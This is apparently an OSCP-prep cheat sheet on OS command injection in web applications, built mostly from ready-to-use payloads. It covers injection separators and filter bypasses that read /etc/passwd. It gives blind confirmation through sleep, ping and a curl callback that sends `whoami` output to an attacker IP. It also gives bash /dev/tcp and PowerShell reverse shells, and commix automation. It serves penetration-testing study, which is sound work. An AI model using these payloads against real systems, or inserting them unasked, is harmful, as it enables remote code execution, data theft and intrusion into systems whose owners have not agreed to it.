# 💥 OS Command Injection

> When a web app passes user input into a **system shell** (ping, traceroute, nslookup, file conversion, backup, "check host" features), you can append your own commands and get **RCE directly**. One of the fastest OSCP footholds when a "utility" feature exists.

Related: [[Web Exploitation]] · [[HTTP]] · [[Shells]] · [[RCE]]

---

## 🧠 A "UTILITY" FEATURE → THINK
- Anything that **runs a program** on your input = suspect: ping, DNS lookup, whois, port check, PDF/image convert, backup, `git`, `tar`.
- **Chain your command** with `;`, `|`, `&&`, `||`, `` ` ``, `$(...)`, newline.
- **No output shown?** → it's **blind** — confirm with timing (`sleep`) or OOB (DNS/HTTP to you).
- Get exec → **jump straight to a reverse shell**, don't fiddle in the web field.

## ⚡ QUICK TRIAGE / DETECTION
Baseline the feature (e.g. `?host=127.0.0.1`), then append a separator + a command:
```
127.0.0.1; id
```

```
127.0.0.1 && whoami
```

```
127.0.0.1 | id
```

```
`id`
```

```
$(id)
```
**Look for:** the output of `id`/`whoami` in the response = **direct/in-band** injection. No change = try **blind** confirmation.

## 🔍 BLIND CONFIRMATION
Time-based (response hangs ~5s = injection):
```
127.0.0.1 & ping -c 5 127.0.0.1
```

```
127.0.0.1; sleep 5
```
Out-of-band (start a listener/DNS and watch for a callback):
```bash
sudo tcpdump -i tun0 icmp
```

```
127.0.0.1; ping -c 3 10.10.14.5
```

```
127.0.0.1; curl http://10.10.14.5/$(whoami)
```
**Interpretation:** delayed response or a callback to your box = blind command injection confirmed.

## 📖 WHAT / WHY
- **What:** app builds a shell command string with user input and executes it (`system()`, `exec()`, backticks, `os.system`, `Runtime.exec`).
- **Why it works:** unsanitised input + a shell metacharacter breaks out of the intended command.
- **In-band** returns output; **blind** does not (infer via timing/OOB); **semi-blind** may return error/status.

## 🧗 SEPARATORS & BYPASS TABLE
| Goal | Payload |
|---|---|
| Chain (any shell) | `;` `\n` (`%0a`) |
| Chain on success/fail | `&&` / `\|\|` |
| Pipe output to your cmd | `\|` |
| Inline substitution | `` `cmd` `` / `$(cmd)` |
| Background (Windows/`&`) | `&` |
| Spaces filtered | `${IFS}` → `cat${IFS}/etc/passwd`; or `<` ; or `%09` (tab) |
| Keyword `cat` blocked | `c\at`, `c""at`, `/bin/c?t`, `tac`, `head`, `less`, `nl` |
| Slashes filtered | `${PATH:0:1}` = `/` |
| Quotes/obfuscation | `w'h'o'am'i`, `wh""oami` |
| Windows chaining | `&`, `&&`, `\|`, `\|\|` |

## 💥 EXPLOITATION → REVERSE SHELL
```bash
nc -lvnp 443
```
Linux target (URL-encode when in a GET param):
```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
```
If `bash` reverse fails, try other one-liners ([[Shells]]): `nc -e`, mkfifo, python, perl.
Windows target (PowerShell one-liner, base64 recommended):
```
127.0.0.1 & powershell -e <base64>
```
**Automated (last resort / confirm):**
```bash
commix -u "http://$IP/ping.php?host=127.0.0.1"
```
**Result:** shell as the web user → upgrade ([[Shells]]) → privesc.

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `id` output appears | In-band injection | reverse-shell payload | RCE |
| Response delayed on `sleep` | Blind (time) | exfil via OOB / stage a shell | RCE |
| DNS/HTTP callback fires | Blind (OOB) | curl a reverse-shell script + run | RCE |
| Spaces/keywords filtered | Filter present | `${IFS}`, `c\at`, encoding | bypass → RCE |
| Only Windows cmds work | Windows host | `powershell -e` reverse | RCE |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No output & no delay | Try OOB (DNS/HTTP callback); try each separator individually |
| Everything sanitised | Try other inputs/params; maybe it's argument injection or a different bug |
| Spaces blocked | `${IFS}`, `%09`, `<`, brace tricks |
| Reverse shell won't connect | Change port (443/53), try other one-liners, host a script and `curl\|bash` → [[Shells]] |
| Output truncated | Redirect to a file in webroot and read it, or exfil via curl |
| WAF resets connection | Encode payload, slow down, swap method GET↔POST |

## 🧹 POST-EXPLOITATION
Stabilise ([[Shells]]); `id`; loot webroot for creds → [[Credential Attacks]]; enumerate for privesc.

## ⚠️ COMMON MISTAKES
- Testing only `;` — **try every separator** (`|`, `&&`, `` ` ``, `$()`, newline).
- Concluding "not vulnerable" without a **blind** (timing/OOB) test.
- Not URL-encoding payloads in GET params (spaces, `&`, `;`).
- Staying in the web field instead of getting a **reverse shell**.

## 🧭 OSCP EXAM MINDSET
Any feature that "does something" with your input on the OS is a command-injection candidate. Confirm cheaply (`; id` or `; sleep 5`), and if output is hidden, prove it blind with a `ping`/`curl` to your box. The instant it executes, pivot to a reverse shell — don't run 40 commands through a text box.

## ✅ DON'T MISS
- [ ] Try all separators: `;` `|` `&&` `||` `` ` `` `$()` newline
- [ ] Blind test: `sleep`/`ping` (timing) + OOB callback
- [ ] Filter bypass: `${IFS}`, `c\at`, encoding
- [ ] URL-encode in GET params
- [ ] Reverse shell → upgrade → loot

## 📇 CHEAT SHEET
```
;id    |id    &&id    `id`    $(id)          # detect
```

```
;sleep 5      ;ping -c 3 10.10.14.5          # blind (timing / OOB)
```

```
;bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'    # reverse (Linux)
```

```
cat${IFS}/etc/passwd                          # space bypass
```

```bash
commix -u "http://$IP/ping.php?host=127.0.0.1"   # automate/confirm
```
**Kill shots:** `; id` → confirmed → `; bash -i` reverse shell.
